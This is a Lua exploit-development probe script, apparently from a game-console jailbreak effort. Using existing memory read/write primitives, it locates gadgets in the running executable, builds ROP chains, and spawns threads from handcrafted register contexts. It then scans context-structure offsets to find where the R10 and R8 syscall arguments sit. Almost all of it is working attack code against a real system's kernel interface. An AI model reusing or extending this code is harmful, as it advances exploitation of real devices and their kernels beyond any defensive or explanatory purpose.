-- CRASH_CLASS: LOW
-- PROBE 91u: Definitive R10/R8 offset scan
--
-- ROOT CAUSE OF ALL PRIOR CORRUPTION: thr_kill(tid, SIGKILL)
-- kills the ENTIRE process, not just the thread. Every 91p-91r
-- probe died at the first thr_kill(9) call, producing partial
-- output. The "77" + binary was the truncated output buffer.
--
-- Fix: NO thr_kill. Children sleep 999s, die at process exit.
-- ALL buffers in mmap (except inf for dynlib_get_info).
-- Child does setsockopt then nanosleep (NO userland writes).
-- Test: set UNICAST_HOPS=42, child tries to set 77.

print("=== PROBE 91u: R10 FINAL ===")
print("")

local function N(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}; for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n; setmetatable(t,getmetatable(syscall.pipe)); return t
end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function rd(a)
    local ok,v=pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok,v=pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function z(b,n) for o=0,n-4,4 do wd(b+o,0) end end

local stub=syscall.pipe.fn_addr
local SA=syscall.syscall_address
local pid=N(native.fcall_with_rax(stub,20))
print("pid="..pid)

local mm=mk(477); local tc=mk(430)

-- Eboot gadgets
local inf=memory.alloc(0x200); wd(inf,0x160)
pcall(function() mk(593)(uint64(0),inf) end)
local elo=rd(inf+0x108) or 0; local ehi=rd(inf+0x10C) or 0
if ehi<0 then ehi=ehi+0x100000000 end
if elo<0 then elo=elo+0x100000000 end
local PRDI=uint64(string.format("0x%X%08X",ehi,elo+0xC9DFE))
local PRSI=uint64(string.format("0x%X%08X",ehi,elo+0xD77D))
local PRAX=uint64(string.format("0x%X%08X",ehi,elo+0x992))

local _DI=0x048;local _SI=0x050;local _DX=0x058;local _AX=0x078
local _CS=0x0C0;local _FL=0x0D0;local _IP=0x0E0
local _SP=0x0F8;local _SS=0x100;local _MG=0x108;local _TP=0x110

-- Large mmap: enough for data + many stacks + many contexts
-- Each child needs 1 stack page + 1 context page
-- Max children ~120 (11x11 matrix) = 240 pages = ~4MB
local NCHILDREN=130
local ok_m,region=pcall(function()
    return mm(uint64(0),uint64((2+2*NCHILDREN)*0x4000),uint64(3),
        uint64(0x1002),uint64(0xFFFFFFFF),uint64(0))
end)
if not ok_m then print("MMAP FAIL") return end
local R=N(region)
print("region="..string.format("0x%X",R))

-- Data page (page 0)
local optval=R         -- 4 bytes = 77
local ts=R+0x10        -- 16 bytes nanosleep 999s
local sl=R+0x30        -- 16 bytes short sleep 50ms
local hb=R+0x50        -- 4 bytes for set_hops
local gb=R+0x60        -- 8 bytes for get_hops
local gl=R+0x70        -- 4 bytes for get_hops optlen
local tb=R+0x80        -- 8 bytes thr_create output

wd(optval,77)
wq(ts,uint64(999)); wq(ts+8,uint64(0))
wq(sl,uint64(0)); wq(sl+8,uint64(50000000))

-- Per-child pages start at page 2
local function child_stk(i) return R+0x4000*(2+2*i) end
local function child_ctx(i) return R+0x4000*(2+2*i+1) end

-- Create IPv6 socket
local s6=N(native.fcall_with_rax(stub,97,28,2,0))
print("s6="..s6)
if s6<=0 then print("NO IPv6") return end

local function set_hops(val)
    wd(hb,val)
    native.fcall_with_rax(stub,105,s6,41,4,hb,4)
end
local function get_hops()
    wd(gb,0); wd(gb+4,0); wd(gl,4)
    native.fcall_with_rax(stub,118,s6,41,4,gb,gl)
    return rd(gb)
end

set_hops(42)
print("baseline="..tostring(get_hops()))

-- ============================================================
-- Test function: NO thr_kill
-- ============================================================
local child_idx=0
local function test(r10_off, r8_off, label)
    set_hops(42)

    local stk=child_stk(child_idx)
    local ctx=child_ctx(child_idx)
    child_idx=child_idx+1

    -- ROP: after setsockopt, clear RSI then nanosleep (repeated)
    local sp=stk
    for i=1,5 do
        wq(sp,PRSI); sp=sp+8; wq(sp,uint64(0)); sp=sp+8
        wq(sp,PRDI); sp=sp+8; wq(sp,uint64(ts)); sp=sp+8
        wq(sp,PRAX); sp=sp+8; wq(sp,uint64(240)); sp=sp+8
        wq(sp,SA); sp=sp+8
    end

    -- Context
    z(ctx,0x200)
    wq(ctx+_MG,uint64(0x480)); wd(ctx+_FL,0)
    wq(ctx+_TP,uint64(0x10000))
    wq(ctx+_CS,uint64(0x43)); wq(ctx+_SS,uint64(0x3B))
    wq(ctx+_IP,SA); wq(ctx+_SP,uint64(stk))
    wq(ctx+_AX,uint64(105))
    wq(ctx+_DI,uint64(s6))
    wq(ctx+_SI,uint64(41))
    wq(ctx+_DX,uint64(4))
    wq(ctx+r10_off,uint64(optval))
    if r8_off~=r10_off then
        wq(ctx+r8_off,uint64(4))
    end

    -- Spawn (NO kill afterwards)
    wq(tb,uint64(0))
    pcall(function() tc(uint64(ctx),uint64(tb),uint64(0)) end)

    -- Wait 50ms
    native.fcall_with_rax(stub,240,sl,0)

    local hops=get_hops()
    local hit=(hops==77)
    local tag=""
    if hit then tag=" ***HIT***" end
    print(string.format("  %s h=%s%s",label,tostring(hops),tag))
    return hit
end

-- ============================================================
-- Phase 1: Standard (R10=0x090, R8=0x068)
-- ============================================================
print("=P1=")
local found=test(0x090,0x068,"std")

-- ============================================================
-- Phase 2: Scan R10 with R8=0x068
-- ============================================================
if not found then
    print("=P2=")
    local c={0x060,0x068,0x070,0x080,0x088,0x098,0x0A0,0x0A8,0x0B0,0x0B8}
    for _,r in ipairs(c) do
        found=test(r,0x068,string.format("R10=%03X",r))
        if found then break end
    end
end

-- ============================================================
-- Phase 3: Scan R8 with R10=0x090
-- ============================================================
if not found then
    print("=P3=")
    local c={0x060,0x070,0x080,0x088,0x098,0x0A0,0x0A8,0x0B0,0x0B8}
    for _,r in ipairs(c) do
        found=test(0x090,r,string.format("R8=%03X",r))
        if found then break end
    end
end

-- ============================================================
-- Phase 4: Cross matrix
-- ============================================================
if not found then
    print("=P4=")
    local all={0x060,0x068,0x070,0x080,0x088,0x090,0x098,0x0A0,0x0A8,0x0B0,0x0B8}
    for _,r10 in ipairs(all) do
        for _,r8 in ipairs(all) do
            if r10~=r8 then
                found=test(r10,r8,string.format("%03X/%03X",r10,r8))
                if found then break end
            end
        end
        if found then break end
    end
end

if not found then
    print("")
    print("*** NO R10/R8 FOUND ***")
end

print("")
print("canary="..N(native.fcall_with_rax(stub,20)))
print("=== 91u DONE ===")
